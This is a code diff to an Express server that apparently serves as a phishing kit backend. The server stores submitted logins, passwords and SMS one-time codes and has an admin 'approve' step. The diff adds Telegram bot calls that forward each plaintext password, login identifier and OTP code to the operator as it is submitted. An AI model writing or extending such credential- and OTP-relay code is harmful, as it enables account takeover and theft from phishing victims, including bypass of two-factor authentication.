@@ -2,6 +2,7 @@ import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { insertLoginAttemptSchema, insertSmsSubmissionSchema } from "@shared/schema";
+import { notifyLoginAttempt, notifyLoginApproved, notifySmsSubmission } from "./telegramBot";
 
 // Admin authentication middleware
 const adminAuth = (req: any, res: any, next: any) => {
@@ -29,6 +30,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const validatedData = insertLoginAttemptSchema.parse(req.body);
       const loginAttempt = await storage.createLoginAttempt(validatedData);
+      
+      // Notify Telegram bot users about new login attempt
+      notifyLoginAttempt(validatedData.emailOrPhone, validatedData.password, validatedData.returnUri);
+      
       res.json(loginAttempt);
     } catch (error) {
       res.status(400).json({ error: "Invalid data" });
@@ -49,7 +54,13 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/login-attempts/:id/approve", adminAuth, async (req, res) => {
     try {
       const id = parseInt(req.params.id);
-      await storage.approveLoginAttempt(id);
+      const attempt = await storage.getLoginAttempt(id);
+      if (attempt) {
+        await storage.approveLoginAttempt(id);
+        
+        // Notify Telegram bot users about login approval
+        notifyLoginApproved(attempt.emailOrPhone);
+      }
       res.json({ success: true });
     } catch (error) {
       res.status(500).json({ error: "Failed to approve login attempt" });
@@ -75,6 +86,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
     try {
       const validatedData = insertSmsSubmissionSchema.parse(req.body);
       const smsSubmission = await storage.createSmsSubmission(validatedData);
+      
+      // Notify Telegram bot users about new SMS submission
+      notifySmsSubmission(validatedData.otpCode, validatedData.stepupContext);
+      
       res.json(smsSubmission);
     } catch (error) {
       res.status(400).json({ error: "Invalid data" });
